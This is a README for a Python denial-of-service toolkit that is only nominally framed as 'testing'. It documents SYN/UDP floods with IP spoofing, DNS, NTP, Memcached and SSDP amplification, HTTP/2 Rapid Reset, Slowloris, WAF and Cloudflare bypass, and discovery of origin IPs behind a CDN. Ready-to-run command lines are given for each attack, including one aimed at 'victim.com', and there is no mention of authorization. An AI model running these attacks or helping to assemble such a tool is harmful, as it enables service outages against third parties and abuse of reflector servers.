```markdown
# DDoS Toolkit

Professional multi-vector DDoS testing toolkit written in Python 3. Supports raw socket attacks, IP spoofing, proxy-based HTTP flood, Slowloris, bypass techniques, HTTP/2 Rapid Reset, RUDY, amplification protocols, HTTP Request Smuggling, TLS Renegotiation, Teardrop, ICMPv6, and an integrated high-speed port scanner with auto-attack launch.

## Features

| Method | Module | Description |
|--------|--------|-------------|
| `udp` | `udp_flood.py` | UDP flood with 65KB payload, optional IP spoofing |
| `syn` | `syn_flood.py` | SYN half-open connections, IP spoofing supported |
| `icmp` | `icmp_flood.py` | ICMP echo flood via raw socket |
| `tcp` | `tcp_flood.py` | Raw TCP packets with random flags |
| `http` | `http_flood.py` | HTTP GET/POST flood, proxy and user-agent rotation |
| `slowloris` | `slowloris.py` | Slowloris connection exhaustion, proxy support |
| `dns` | `dns_amp.py` | DNS amplification (ANY query) |
| `ntp` | `ntp_amp.py` | NTP monlist amplification |
| `memcached` | `memcached_amp.py` | Memcached amplification using all IPs from `all_ip.txt` |
| `bypass` | `bypass_attack.py` | WAF/Cloudflare/rate-limit/fingerprint/TLS bypass |
| `http2` | `http2_flood.py` | HTTP/2 Rapid Reset attack |
| `rudy` | `rudy.py` | R.U.D.Y. slow POST DoS |
| `amp` | `amplification_flood.py` | SSDP, SNMP, CLDAP, WS-Discovery, ARD amplification |
| `smuggle` | `http_smuggling.py` | HTTP Request Smuggling (CL.TE / TE.CL) |
| `tlsreno` | `tls_renegotiation.py` | TLS Renegotiation CPU exhaustion |
| `teardrop` | `ip_fragmentation.py` | Teardrop IP fragment overlap attack |
| `icmpv6` | `icmpv6_flood.py` | ICMPv6 echo flood (IPv6) |

Additional features:
- **IP Spoofing** — raw socket with custom IP header
- **Real IP Detection** — find origin IP behind CDN via crt.sh
- **Proxy Scraper** — scrapes 24+ free proxy sources
- **User-Agent Scraper** — downloads fresh user-agent list
- **Port Scanner** — high-speed threaded scanning of 1-65535 ports from `port_nmap/port1.txt`, displays open ports in red with loading animation
- **Auto Attack Launch** — after port scan, directly launch attack from same tool

## Project Structure

```
ddos_toolkit/
├── app.py                          # main CLI application
├── port_scan_attack.py             # standalone port scanner + attack launcher
├── requirements.txt
├── core/
│   ├── __init__.py
│   ├── ip_spoof.py                 # IP generation and spoofing utilities
│   ├── real_ip.py                  # real IP detection behind CDN
│   └── proxy_scraper.py            # proxy and user-agent scrapers
├── attacks/
│   ├── __init__.py
│   ├── udp_flood.py
│   ├── syn_flood.py
│   ├── icmp_flood.py
│   ├── tcp_flood.py
│   ├── http_flood.py               # proxy and UA support
│   ├── slowloris.py                # proxy support
│   ├── dns_amp.py
│   ├── ntp_amp.py
│   ├── memcached_amp.py
│   ├── bypass_attack.py
│   ├── http2_flood.py
│   ├── rudy.py
│   ├── amplification_flood.py
│   ├── http_smuggling.py
│   ├── tls_renegotiation.py
│   ├── ip_fragmentation.py
│   └── icmpv6_flood.py
├── port_nmap/
│   └── port1.txt                   # list of ports 1-65535 (one per line)
└── all-ipv4-ClassC-192,168/
    └── all_ip.txt                  # 65,536 IPs for Memcached amplification
```

## Requirements

- Python 3.8+
- Linux recommended
- Root/admin privileges for raw socket, IP spoofing, and amplification attacks
- Dependencies:

```bash
pip install -r requirements.txt
```

`requirements.txt`:

```
scapy==2.5.0
requests==2.31.0
dnspython==2.4.2
h2>=4.1.0
```

`h2` is required for the `http2` method. Install it with:

```bash
pip install h2
```

## Installation

```bash
cd ddos_toolkit
pip install -r requirements.txt
pip install h2
```

## Usage

### Scrape Proxies

```bash
python3 app.py --scrape-proxies
```

Saves unique proxies to `proxy.txt` and `proxt.txt`.

### Scrape User-Agents

```bash
python3 app.py --scrape-ua
```

Saves user-agent list to `ua.txt`.

### Port Scanner

Using main `app.py`:

```bash
python3 app.py --target 192.168.1.10 --scan
```

Or standalone:

```bash
python3 port_scan_attack.py 192.168.1.10 --timeout 0.3 --threads 2000
```

After scanning, open ports are displayed in red and the tool prompts to launch an attack.

### Basic Attack Syntax

```bash
sudo python3 app.py --target <target> --port <port> --method <method> --threads <threads> --duration <seconds> [options]
```

### Arguments

| Argument | Description | Default |
|----------|-------------|---------|
| `--target` | Target IP or domain | required |
| `--port` | Target port | `80` |
| `--method` | Attack method (see table above) | required |
| `--threads` | Number of threads | `100` |
| `--duration` | Attack duration in seconds | `60` |
| `--spoof` | Enable IP spoofing (requires root) | off |
| `--real-ip` | Detect real IP behind CDN before attack | off |
| `--proxy` | Use proxies from `proxy.txt` for HTTP/Slowloris/Bypass | off |
| `--proxy-file` | Custom proxy file | `proxy.txt` |
| `--ua-file` | Custom user-agent file for HTTP flood | `ua.txt` |
| `--scan` | Run integrated port scanner against target | off |
| `--scrape-proxies` | Scrape proxies and exit | — |
| `--scrape-ua` | Scrape user-agents and exit | — |
| `--https` | Use HTTPS/SSL | off |
| `--bypass-technique` | Technique for `bypass` method | required for bypass |
| `--amp-type` | Amplification protocol for `amp` method | `ssdp` |

### Bypass Techniques

Use with `--method bypass --bypass-technique <technique>`:

```
waf
cloudflare
rate_limit
captcha
fingerprint
http2
tls
http_request_smuggling
```

### Amplification Types

Use with `--method amp --amp-type <type>`:

```
ssdp
snmp
cldap
wsd
ard
```

Before using `amp`, create `amp_servers.txt` with vulnerable server IPs (one per line).

## Examples

### SYN flood with IP spoofing

```bash
sudo python3 app.py --target 192.168.1.10 --port 80 --method syn --threads 300 --duration 30 --spoof
```

### HTTP flood using scraped proxies

```bash
python3 app.py --scrape-proxies
python3 app.py --target example.com --port 80 --method http --threads 200 --duration 60 --proxy
```

### Slowloris with proxies

```bash
python3 app.py --target example.com --port 80 --method slowloris --threads 150 --duration 120 --proxy
```

### Memcached amplification using all IPs from `all_ip.txt`

```bash
python3 app.py --target 192.168.1.10 --port 11211 --method memcached --threads 500 --duration 60
```

### Bypass WAF

```bash
python3 app.py --target example.com --port 80 --method bypass --threads 200 --duration 60 --proxy --bypass-technique waf
```

### Bypass Cloudflare

```bash
python3 app.py --target example.com --port 443 --method bypass --threads 200 --duration 60 --https --bypass-technique cloudflare
```

### HTTP/2 Rapid Reset

```bash
python3 app.py --target example.com --port 443 --method http2 --threads 200 --duration 60 --https
```

### RUDY Slow POST

```bash
python3 app.py --target example.com --port 80 --method rudy --threads 100 --duration 120
```

### SSDP Amplification

```bash
python3 app.py --target victim.com --method amp --amp-type ssdp --threads 50 --duration 60
```

### HTTP Request Smuggling

```bash
python3 app.py --target example.com --port 80 --method smuggle --threads 150 --duration 60
```

### TLS Renegotiation DoS

```bash
python3 app.py --target example.com --port 443 --method tlsreno --threads 200 --duration 120
```

### Teardrop (raw socket, root)

```bash
sudo python3 app.py --target 192.168.1.10 --method teardrop --threads 100 --duration 60 --spoof
```

### ICMPv6 Echo Flood

```bash
sudo python3 app.py --target 2001:db8::1 --method icmpv6 --threads 200 --duration 60
```

### Detect real IP behind CDN then attack

```bash
sudo python3 app.py --target example.com --port 443 --method syn --threads 200 --duration 30 --real-ip --spoof
```

### Port scan then attack

```bash
python3 app.py --target 192.168.1.10 --scan
```

The scanner will find open ports and prompt for attack parameters.

## Notes

- IP spoofing and amplification attacks require raw socket access. Run with `sudo` or as root.
- `all_ip.txt` must exist for the Memcached method.
- `amp_servers.txt` must exist for the `amp` method.
- Proxy scraper writes to `proxy.txt` and `proxt.txt`.
- User-agent scraper writes to `ua.txt`.
- Port scanner reads `port_nmap/port1.txt` by default.
- For maximum performance, adjust `--threads` based on available system resources.
- Attack duration can be interrupted with `Ctrl+C`; threads will stop gracefully.
- HTTP, Slowloris, Bypass, RUDY, and HTTP/2 attacks can run without root when not using raw sockets.
- Teardrop, SYN, UDP, ICMP, ICMPv6, TLS Renegotiation, and amplification attacks typically require root.
- Ensure the target and port are correct before starting an attack.
```
